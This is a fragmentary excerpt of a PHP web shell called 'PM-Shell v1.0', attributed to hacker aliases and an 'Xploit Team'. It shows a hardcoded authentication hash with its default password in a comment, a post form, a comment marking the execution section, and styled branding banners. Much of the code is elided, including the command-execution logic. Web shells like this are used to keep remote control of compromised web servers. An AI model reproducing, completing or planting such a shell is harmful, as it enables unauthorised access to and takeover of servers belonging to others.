...
$auth_pass = "a88f43add8b374142835aabe200c17e1"; // default: ./Mruw4x21
$color = "#00ff00";
...
<html>
<head>
<link href='https://i.ibb.co/9Hhs9WD/Tangerang-Xploit-Team-20200908-193749.jpg' rel='SHORTCUT ICON'/>
...
<header>
	...
	<font style="color:#000;text-shadow:0px 5px 8px #191970;font-size:90px" face="Ubuntu">PM-Shell v1.0</font><br>
	<img src="" width=24% height=60%>
<form method="post">
...
//eksekusi
echo "Name of Shell: <font style='color:#00f;text-shadow:5px 5px 12px #191970;font-size:15px' face='Wallpoet'>mini shell by Mr.d30</font><br>";
...
echo "<center><hr width=280 color=#191970>Copyright © ".date("Y")." - <a href='https://s1.postimg.org/3i7tcvdrbj/Shade.png'><font color=blue>Mr.Uw4X</font></a></center>
</body>
</html>";
